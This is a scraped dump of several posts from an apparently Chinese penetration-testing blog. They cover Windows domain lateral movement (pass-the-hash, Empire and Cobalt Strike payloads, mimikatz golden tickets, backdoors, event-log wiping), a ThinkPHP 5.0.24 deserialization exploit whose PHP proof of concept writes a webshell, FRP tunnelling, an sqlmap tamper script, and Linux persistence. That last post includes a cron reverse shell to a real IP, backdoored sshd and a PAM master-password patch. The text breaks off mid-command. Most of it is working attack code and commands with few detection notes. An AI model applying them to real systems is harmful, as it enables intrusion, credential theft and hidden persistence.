examplesproxychains python wmiexec.py -debug &#39;administrator:vulstack@1@192.168.52.138&#39;proxychains python wmiexec.py -debug -hashes 00000000000000000000000000000000:8601a88798be6a3948fce638a5790741 &#39;administrator@192.168.52.138&#39; 或者这个：https://github.com/Kevin-Robertson/Invoke-TheHash 先上传 1Import-Moudle .\\Invoke-TheHash.psd1 1Invoke-WMIExec -Target 192.168.52.138 -Domain workgroup -Username administrator -Hash 8601a88798be6a3948fce638a5790741 -Command &quot;calc.exe&quot; -verbose 这个得得到一个ps的shell 这里使用Empire https://github.com/BC-SECURITY/Empire 1234uselistener httpset Port 8080set Name testexecute 12backlist 12345usestager（空格+tab）usestager windows&#x2F;launcher_batinfoset Listener testexecute 生成launcher.bat 123@echo offstart &#x2F;b powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AHAAZQAoACcAUwB5AHM...start &#x2F;b &quot;&quot; cmd &#x2F;c del &quot;%~f0&quot;&amp;exit &#x2F;b 收到了请求，但是没有agents 123usestager launcher_vbs testset Listener testexecute 没成功 内网其它主机端口-代理转发我主要是通过ew Frp内网穿透把自己的kali放到公网上，参考之前的文章 https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/ CS上线内网主机proxychains启动cs，并执行 生成beacon.exe 利用ipc上传或者smbclient上传 1copy beacon.exe \\\\192.168.52.138\\c$ 12proxychains smbclient &#x2F;&#x2F;192.168.52.138&#x2F;c$ -U administratorput &#x2F;tmp&#x2F;beacon.exe 利用wmi执行 成功上线 SSH隧道 这种代理方式需要比较高的权限(system/root)直接使用系统功能来开启内网代理的隧道，通过SSH隧道进行代理 12ssh -qTfnN -L port:host:hostport -l user remote_ip #正向隧道，监听本地portssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道，用于内网穿透防火墙限制之类 12ssh -CfNg -L port1:127.0.0.1:port2 user@host #本地转发ssh -CfNg -R port2:127.0.0.1:port1 user@host #远程转发 持久控制域成员信息收集 123456net localgroup administrator &#x2F;domainnet group &#x2F;domainnet group &quot;domain admins&quot; &#x2F;domainnet user &#x2F;domaindsquery usernet accounts &#x2F;domain 利用SPN快速扫描域内存活相关服务以及快速定位服务器 1setspn -T OWA-god.god.org -Q *&#x2F;* HTTP Listener交互信息隐藏 1.将Cobalt Strike配置文件转换为功能性的mod_rewrite .htaccess或Nginx配置文件，以支持将HTTP反向代理重定向到Cobalt Strike团队服务器。使用反向代理可以保护后端C2服务器免受分析，调查和一般Internet背景辐射。https://github.com/threatexpress/cs2modrewrite2.Cobalt Strike通过Malleable C2配置文件修改其流量。配置文件提供了高度可定制的选项，用于修改服务器的C2流量在线路上的形式。Malleable C2配置文件可增加强事件响应的规避，使用的合法内部应用程序冒充已知对手或伪装目标。https://github.com/rsmudge/Malleable-C2-Profiles SSP 1.SSP，用于扩展Windows身份验证机制。LSASS进程正在Windows启动期间加载安全支持提供程序DLL。这种行为使红队的攻击者可以删除一个任意的SSP DLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行修补。 2.项目Mimikatz提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。Mimikatz通过向LSASS注入新的SSP来支持内存技术选项。 12privilege::debugmisc::memssp 金票利用 krbtgt账户：每个域控制器都有一个“krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）加密的密钥。黄金票据（Golden Ticket）：使在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。 获取金票需要的ntml和sid 12mimikatz# LsaDump::dcsync &#x2F;domain:god.org &#x2F;all &#x2F;csvwhoami &#x2F;user 1mimikatz # kerberos::golden &#x2F;user:administrator &#x2F;domain:test.lab &#x2F;sid:S-1-5-21-2952760202-1353902439-2381784089-500 &#x2F;krbtgt:58e91a5ac358d86513ab224312314061 &#x2F;user:god &#x2F;ticket:gold2.kirbi 123kerberos::ptt gold2.kirbi #导入票据kerberos::list #列出票据kerberos::purge # 清除票据 后门植入使用persistence启动项后门在C:\\Users***\\AppData\\Local\\Temp\\目录下，上传一个vbs脚本在注册表HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\加入开机启动项 metsvc服务后门 在C:\\Users***\\AppData\\Local\\Temp\\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter 1run metsvc -A 连接后门，set payload windows/metsvc_bind_tcp 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;metsvc_bind_tcpset rhost 192.168.1.133set lport 31337exploit 重新进入session即可 痕迹清理 meterpreter: clearev https://github.com/3gstudent/Windows-EventLog-Bypass 1PS C:\\&gt; Invoke-Phant0m 总结还需要学习Empire，后门数据传输的加密，免杀的制作，以及真实环境中如何快速高效的制定计划。 参考链接： https://mp.weixin.qq.com/s/nAGjUsre2Hg_IkCPXLxYDQ https://mp.weixin.qq.com/s/QLoXt5JTjHreUkZIg1uW3g","categories":[],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://glotozz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"tp5.0.24反序列化漏洞分析","slug":"tp5-0-24反序列化漏洞复现","date":"2020-03-13T23:21:02.000Z","updated":"2020-03-20T13:39:22.494Z","comments":true,"path":"2020/03/14/tp5-0-24反序列化漏洞复现/","link":"","permalink":"https://glotozz.github.io/2020/03/14/tp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞分析 三、POC编写 参考链接： 昨夜对一h网进行渗透测试，该网站是基于tp5.0.24二次开发的，就想着自己也分析一下（主要是没给poc哈哈），力哥挖的嗷😁 一、获取漏洞 http://www.thinkphp.cn/donate/download/id/1279.html application/index/controller/Index.php 12345678910111213&lt;?phpnamespace appindexcontroller;class Index&#123; public function index($input='') &#123; echo \"Welcome thinkphp 5.0.24\"; echo $input; unserialize($input); &#125;&#125; http://127.0.0.1/tp5.0.24/public/index.php 二、漏洞分析虽然之前自己没有分析过tp5.0.x的反序列化，因为tp5.0.0~tp5.0.23有一条直接RCE的POP链，但是想来也差不多。而tp5.0.24中对传入的_method进行白名单限制，因此无法调用任意类方法。 Thinkphp 5.0.x反序列化最后触发RCE，要调用的Request类__call方法，因此也被限制。 需要寻找其他的__call方法，然后力哥找到了下面这里 Output.php 追踪block()方法 存在文件写入，可以利用。 开始分析POP链 看了下发现tp5.0.x、tp5.1.x、tp5.2.x 反序列化入口点都是一样的 thinkphp/library/think/process/pipes/Windows.php 追踪removeFiles() 这里的file_exist()触发__toString()，因此可以作为跳板 全局搜索__toString()寻找利用点 thinkphp/library/think/Model.php 追踪toJson() 追踪toArray() 存在这三个动态方法调用，最后只有第三处可行 因为要作为跳板，想办法控制$value和$attr 这里的parseName()是个字符串命名风格转换，基本没啥变化 控制$modelRelation需要在当前类中寻找一个无参方法 跟进getRelationData() 这个方法说明是获取关联模型数据，需要满足第一个if条件，这里比较麻烦，先看下面。假设满足，返回$this-&gt;parent 接下来需要寻找一个有getBindAttr()方法的类，全局搜索发现只有一个OneToOne类 也是可控的，因为是抽象类，寻找继承OneToOne()的类，并且满足前面那个if条件，最终发现HasOne类可用，具体变量值等下调试看看结果 之后就是利用$value-&gt;getAttr($attr)这个跳板触发Output类中的__call() block() writeln() write() $this-&gt;handle可控，可以作为跳板，全局搜索write() thinkphp/library/think/session/driver/Memcached.php 可作为跳板，全局搜索-&gt;set thinkphp/library/think/cache/driver/File.php $filename可控因此可以用伪协议绕过exit，但是这里的$data根据传参为布尔型， 跟进setTagItem() 这里的$value可控即传入的$name，是前面的 1$filename &#x3D; $this-&gt;getCacheKey($name, true); 跟进getCacheKey() 这里需要利用伪协议php://filter/write=string.rot13/resource=./cuc cucvasb();?&gt;作为文件名，从而实现文件写入 至此，POP链完成 可以参考力哥的POP链图 三、POC编写123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115&lt;?phpnamespace think\\process\\pipes;#Windowsuse think\\model\\Pivot;class Windows&#123;//不使用继承 private $files = []; function __construct()&#123; $this-&gt;files = [new Pivot()];//触发Model __toString(),Model子类Pivot合适 &#125;&#125;namespace think\\db;#Queryuse think\\console\\Output;class Query&#123; protected $model; function __construct()&#123; $this-&gt;model = new Output();//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent) &#125;&#125;namespace think\\model;#Relationuse think\\db\\Query;abstract class Relation&#123; protected $selfRelation; protected $query; function __construct()&#123; $this-&gt;selfRelation = false;//满足if语句 $this-&gt;query = new Query();//满足if语句 &#125;&#125;namespace think\\model\\relation;#OneToOne HasOneuse think\\model\\Relation;//使用了Relation类abstract class OneToOne extends Relation&#123;//需要$selfRelation和$query，使用继承 protected $bindAttr = []; function __construct()&#123; parent::__construct(); $this-&gt;bindAttr = ['key','value'];//即$bindAttr &#125;&#125;class HasOne extends OneToOne&#123;&#125;namespace think\\cache;#Driverabstract class Driver&#123; protected $tag; protected $options = []; function __construct()&#123; $this-&gt;tag = true;//满足if ($this-&gt;tag &amp;&amp; !is_file($filename)) $this-&gt;options = [ // 'path' =&gt; './demo/', 'path' =&gt; 'php://filter/write=string.rot13/resource=./demo/&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;', 'data_compress' =&gt; false, 'expire' =&gt; 0, 'cache_subdir' =&gt; false,//if ($this-&gt;options['cache_subdir']) &#123; 'prefix' =&gt; '', ]; &#125;&#125;namespace think\\cache\\driver;#Fileuse think\\cache\\Driver;class File extends Driver&#123;//需要$tag以及setTagItem()，使用继承&#125;namespace think\\session\\driver;#Memcacheduse think\\cache\\driver\\File;class Memcached&#123;//因为这里没用到SessionHandler，因此没必要继承 protected $handler = null; function __construct()&#123; $this-&gt;handler = new File();//$this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']); &#125;&#125;namespace think\\console;#Outputuse think\\session\\driver\\Memcached;class Output&#123; protected $styles = []; private $handle = null; function __construct()&#123; $this-&gt;styles = ['getAttr'];//满足if (in_array($method, $this-&gt;styles)) $this-&gt;handle = new Memcached();//$this-&gt;handle-&gt;write($messages, $newline, $type); &#125;&#125;namespace think;#Modeluse think\\model\\Relation\\HasOne;use think\\console\\Output;abstract class Model &#123; protected $append = []; protected $error; public $parent;//坑点 function __construct()&#123; $this-&gt;append = ['key'=&gt;'getError'];//value为$relation,因此为getError $this-&gt;error = new HasOne();//即$modelRealtion $this-&gt;parent = new Output();//即$value &#125;&#125;namespace think\\model;#Pivotuse think\\Model;class Pivot extends Model&#123;&#125;namespace think\\process\\pipes;$a = base64_encode(serialize(new Windows()));echo $a;var_dump(unserialize(base64_decode($a))); 有个3个需要注意的地方 一、model子类Pivot中也有该变量parent，属性为public；而基类model的parent为protected 将Model类中的parent设为public，但是对于php版本似乎仍有要求。。php7.3.12失败，测试5.6.40，7.3.8，7.0.33可用 二、Windows下使用php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;无法正常反序列化，调试发现只能正常初始化Windows类，并且Windows下不支持这种文件名 切换到Linux下 三、如果网站不允许写文件，可以先创建一个755的目录 getCacheKey()方法， 123if ($auto &amp;&amp; !is_dir($dir)) &#123; mkdir($dir, 0755, true);&#125; $auto为true，将path设为./demo 分析下最后的调用 第一次set(&#39;&lt;getAttr&gt;key&lt;getAttr&gt;&#39;, true, expire=3000) 中途调用setTagItem(path+md5(name)+.php) 在setTagItem()中第二次set(tag_md5(1), path+md5(name)+.php) file_put_contents(path+md5(name)+.php, &lt;?php\\n//000000000000\\n exit();?&gt;\\n+serialize(path+md5(name)+.php)) 注意下?的url编码 参考链接： https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7 http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/?tdsourcetag=s_pctim_aiomsg https://xz.aliyun.com/t/7082","categories":[],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://glotozz.github.io/tags/thinkphp/"}]},{"title":"FRP搭建","slug":"FRP搭建","date":"2020-03-13T04:07:35.000Z","updated":"2020-03-13T09:22:35.331Z","comments":true,"path":"2020/03/13/FRP搭建/","link":"","permalink":"https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 FRP 服务端配置 FRP客户端配置 反弹shell测试 参考链接： 之前都是花生壳简单的内网穿透，因为服务端不是我们自己的，因此在一些实战中无法满足需求。 FRP 是一个使用 Go 语言开发的高性能的反向代理应用，可以帮助您轻松地进行内网穿透，对外网提供服务。FRP 支持 TCP、UDP、HTTP、HTTPS等协议类型，并且支持 Web 服务根据域名进行路由转发。 话不多说，开始配置 项目地址：https://github.com/fatedier/frp 首先，网络拓扑图 FRP 服务端配置配置 FRP 服务端的前提条件是需要一台具有公网 IP的设备 frps.ini 12[common]server_port &#x3D; 7000 ./frps -c ./frps.ini监听一个7000端口的FRP服务端 FRP客户端配置frpc.ini 123456789[common]server_addr &#x3D; 118.178.88.46server_port &#x3D; 7000[kali]type &#x3D; tcplocal_ip &#x3D; 192.168.56.124local_port &#x3D; 4444remote_port &#x3D; 1234 ./frps -c ./frpc.ini 这样就可以成功在 FRP 服务端上成功建立一个客户端连接，服务端的1234端口映射着本地虚拟机的4444端口 反弹shell测试 真正的1分钟搞定内网穿透！！ 当然，如果要开启一些服务，需要更加安全的配置，具体可参考github官网。 参考链接： https://www.dazhuanlan.com/2019/08/18/5d595a72cb5d4/","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"SQLMAP-temper编写","slug":"SQLMAP-temper编写","date":"2020-03-12T16:58:06.000Z","updated":"2020-03-13T09:26:18.170Z","comments":true,"path":"2020/03/13/SQLMAP-temper编写/","link":"","permalink":"https://glotozz.github.io/2020/03/13/SQLMAP-temper%E7%BC%96%E5%86%99/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 后台脚本 tamper编写 参考链接： 一般情况下sqlmap比自己写脚本方便，只需要处理好temper脚本，并且sqlmap能针对不同的数据库，这点很重要。 正好之前看到一篇文章，自己也学习下，之后多用用sqlmap。 后台脚本比如有这么一个后台处理的脚本 1234567891011121314151617181920&lt;?phpheader('content-type:text/html;charset=utf-8');//解密过程function decode($data)&#123; $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,''); mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021'); $data = mdecrypt_generic($td,base64_decode(base64_decode($data))); mcrypt_generic_deinit($td); mcrypt_module_close($td); if(substr(trim($data),-6)!=='_mozhe')&#123; echo '&lt;script&gt;window.location.href=\"/index.php\";&lt;/script&gt;'; &#125;else&#123; return substr(trim($data),0,strlen(trim($data))-6); &#125;&#125;$id=decode($_GET['id']);$sql=\"select id,title,content,time from notice where id=$id\";$info=$link-&gt;query($sql);$arr=$info-&gt;fetch_assoc();?&gt; 这里对传入的id进行AES-128-CCB解密之后直接拼接进sql语句查询，之后我查了这个mcrypt_module_open，是个扩展，但是php7.1已经被废弃，于是改用openssl_encrypt() 12345678910111213141516171819202122232425&lt;?phpheader('content-type:text/html;charset=utf-8');//解密过程$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt 加密不同Mcrypt，对秘钥长度要求，超出16加密结果不变 $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;$id = AES::decrypt($_GET['id'],$key);$sql = \"select * from th_user where uid=$id\";$info = $link-&gt;query($sql);$arr = $info-&gt;fetch_assoc();?&gt; tamper编写sqlmap是不会处理这种加密的，因此需要编写一个tamper脚本 测试了一下，php使用openssl_encrypt()和python使用pycrypto模块同时选择AES-128-CBC加密结果不同，我的思路是系统调用一下php 先准备一个被系统的调用2.php 123456789101112131415161718&lt;?php$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt 加密不同Mcrypt，对秘钥长度要求，超出16加密结果不变 $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;echo AES::encrypt(base64_decode($argv[1]),$key);?&gt; tamper脚本aes.py 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python\"\"\"Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission\"\"\"import base64import osfrom Crypto.Cipher import AESfrom lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWESTdef dependencies(): passdef encrypt(text): t = base64.b64encode(text) # print t x = os.popen('php 2.php ' + t).readlines() return x[0]# print encrypt('-1 union select 1,2,3,4')def tamper(payload, **kwargs): return encrypt(payload) 注意，测试的时候将2.php放在/tamper目录下，跑sqlmap的时候需要放在/sqlmap-master下 1python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?id&#x3D;1 --tamper aes.py --current-db 参考链接： https://uknowsec.cn/posts/notes/SQLMap-tamper%E7%BC%96%E5%86%99%E5%B0%9D%E8%AF%95.html","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"Linux下常见维权方式","slug":"Linux下常见维权方式","date":"2020-03-12T01:29:56.000Z","updated":"2020-03-12T12:43:47.241Z","comments":true,"path":"2020/03/12/Linux下常见维权方式/","link":"","permalink":"https://glotozz.github.io/2020/03/12/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%BB%B4%E6%9D%83%E6%96%B9%E5%BC%8F/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 1、一句话添加用户和密码 2、SUID Shell 3、ssh公私钥免密登录 4、软连接 5、SSH wrapper 6、strace后门 7、crontab反弹shell 8、openssh后门 9、PAM后门 10、rookit后门 参考链接： 看了篇文章觉得还不错。本着实践出真知的精神，自己动手操作下 1、一句话添加用户和密码添加普通用户 123456789101112# 创建一个用户名guest，密码123456的普通用户useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest# useradd -p 方法 &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句useradd -p &quot;$(openssl passwd -1 123456)&quot; guest# chpasswd方法useradd guest;echo &#39;guest:123456&#39;|chpasswd# echo -e方法，-e：激活转义字符。# 使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出useradd test;echo -e &quot;123456\\n123456\\n&quot; |passwd test 添加root用户 12# 创建一个用户名guest，密码123456的root用户useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test 有些服务器可能有密码策略，需要将密码设置的复杂些 这时候看一下/etc/passwd 明显guest2是root权限 *可疑用户排查 * awk命令语法： awk工作流程是这样的：读入有’\\n’换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是”空白键” 或 “[tab]键” -F指定分隔符 123456# 查询特权用户特权用户(uid 为0)awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd# 查询可以远程登录的帐号信息awk &#39;&#x2F;\\$1|\\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow# 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot; 可疑用户删除 userdel guest1 2、SUID Shell Suid shell是一种可用于以拥有者权限运行的shell。 123# 配合普通用户权限使用cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shellchmod u+s &#x2F;tmp&#x2F;shell 备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。 排查技巧 123456# 在Linux中查找SUID设置的文件find . -perm &#x2F;4000# 在Linux中查找使用SGID设置的文件find . -perm &#x2F;2000# 取消s权限chmod u-s &#x2F;tmp&#x2F;shell 3、ssh公私钥免密登录写入公钥 1234567#将自己主机的home&#x2F;xxx&#x2F;.ssh&#x2F;id_rsa.pub写入靶机&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;authorized_keysssh ford@192.168.56.102ssh-keygenls -la &#x2F;home&#x2F;pinak&#x2F;.sshcat &#x2F;home&#x2F;pinak&#x2F;.ssh&#x2F;id_rsa.pub &gt; &#x2F;home&#x2F;pinak&#x2F;authorized_keyssudo -u sarang cp &#x2F;home&#x2F;pinak&#x2F;authorized_keys &#x2F;home&#x2F;sarang&#x2F;.ssh&#x2F; 排查技巧 1查看&#x2F;root&#x2F;.ssh&#x2F;authorized_keys是否被修改。 使用私钥 12#根据&#x2F;etc&#x2F;passwd确定用户ford后，读取私钥&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;id_rsa，复制下来，注意将id_rsa设置为700ssh ford@192.168.56.102 -p 6688 -i id_rsa 仅靠一个私钥并不能直接登录，但是当时做Cynix靶机的确只读取了私钥即可成功登录。查看了下发现配置PasswordAuthentication no即禁用密码登录，最后发现.ssh目录下authorized_keys填写了靶机自身的公钥。原理和上面的写入公钥相同，只是多了一种思路。但是我之后测试发现还是失败，应该还需要修改什么配置。 4、软连接 在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 /tmp/su 在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。 12#创建软连接，并开启6688端口ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;6688 排查技巧 进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。 5、SSH wrapper init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。 服务端 12345678cd &#x2F;usr&#x2F;sbin&#x2F;mv sshd ..&#x2F;bin&#x2F;echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd#ubuntu&#x2F;etc&#x2F;init.d&#x2F;sshd restart 客户端 1socat STDIO TCP4:118.178.88.46:22,sourceport&#x3D;13377 没成功。应该是服务端系统的原因，上面的需要在ubuntu下，我的服务端是centos 排查技巧 123ls -al &#x2F;usr&#x2F;sbin&#x2F;sshdcat &#x2F;usr&#x2F;sbin&#x2F;sshd# 可通过重装ssh服务恢复。 6、strace后门找到进程PID 12ps -ef | grep sshd #父进程PIDstrace -f -p 2908 -o &#x2F;tmp&#x2F;.ssh.log -e trace&#x3D;read,write -s 2048 通过配置用户目录下.login配置获取ssh明文密码 1234#vim &#x2F;etc&#x2F;bashrcalias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;#source &#x2F;root&#x2F;.bashrc#su，sudo同样的道理 那么只要目标使用ssh，便会在/tmp目录下生成记录 排查技巧 使用alias即可发现异常。 7、crontab反弹shellcrontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。 /etc/evil.sh 12#!&#x2F;bin&#x2F;bashbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;118.178.88.46&#x2F;1234 0&gt;&amp;1 1chmod +sx &#x2F;etc&#x2F;evil.sh /etc/crontab 12#每一分钟执行一次*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh 重启 1234#ubuntuservice cron start#centosservice crond restart 排查技巧 123# 查看可疑的定时任务列表cat &#x2F;etc&#x2F;crontabcrontab -e 8、openssh后门 利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。 123#查看sshd系统版本，之后需要修改ssh -VOpenSSH_6.6.1p1, OpenSSL 1.0.1e-fips 11 Feb 2013 1234567891011121314151617181920212223242526272829303132333435363738a、备份SSH配置文件mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.oldmv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.oldb、解压并安装补丁tar -zxvf openssh-5.9p1.tar.gztar -zxvf 0x06-openssh-5.9p1.patch.tar.gzcp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff openssh-5.9p1&#x2F;cd openssh-5.9p1patch &lt; sshbd5.9p1.diffc、记录用户名和密码的文件位置及其密码vi includes.h #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot; &#x2F;&#x2F;记录登录本机的用户名和密码 #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot; &#x2F;&#x2F;记录本机登录远程的用户名和密码 #define SECRETPW &quot;123456789&quot; &#x2F;&#x2F;后门的密码d、修改版本信息vi version.h #define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot; #define SSH_PORTABLE &quot;小版本号&quot;e、安装并编译.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5make cleanmake &amp;&amp; make installservice sshd restartf、对比原来的配置文件，使配置文件一致，然后修改文件日期。touch -r &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_configtouch -r &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_configg、清除操作记录export HISTFILE&#x3D;&#x2F;dev&#x2F;nullexport HISTSIZE&#x3D;0echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;清空操作日志 修改日志输出和密码 修改version 成功，ilog中记录了本机登录的账号密码，olog中记录了本机登录其他机器的明文密码 排查技巧 利用strace找出ssh后门 123456# 1、获取可疑进程PIps aux | grep sshd# 2、跟踪sshd PIDstrace -o aa -ff -p PID# 3、查看记录密码打开文件grep open sshd* | grep -v -e No -e null -e denied| grep WR 9、PAM后门PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。 利用方法: 12341、获取目标系统所使用的PAM版本，下载对应版本的pam版本2、解压缩，修改pam_unix_auth.c文件，添加万能密码3、编译安装PAM4、编译完后的文件在：modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so，复制到&#x2F;lib64&#x2F;security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。 1rpm -qa | grep pam http://www.linux-pam.org/library/ 1234tar -xvf Linux-PAM-1.1.8.tar.gzcd Linux-PAM-1.1.8cd modules&#x2F;pam_unix&#x2F;vi pam_unix_auth.c 106行添加FILE *fp; 在177行添加 12345678910111213141516&#x2F;*password:&quot;redkey&quot;*&#x2F;if(strcmp(p,&quot;redkey&quot;)&#x3D;&#x3D;0)&#123; retval &#x3D; PAM_SUCCESS;&#125;if(retval&#x3D;&#x3D; PAM_SUCCESS)&#123;&#x2F;*pamfile:pamwd.txt*&#x2F; fp&#x3D;fopen(&quot;pamwd.txt&quot;,&quot;a&quot;); fprintf(fp,&quot;%s::%s\\n&quot;,name,p); fclose(fp);&#125; name &#x3D; p &#x3D; NULL; AUTH_RETURN;&#125; 编译 123cd ..&#x2F;..&#x2F;.&#x2F;configuremake 会根据不同情况调用pam_unix.so 备份原有PAM模块 12find &#x2F; -name 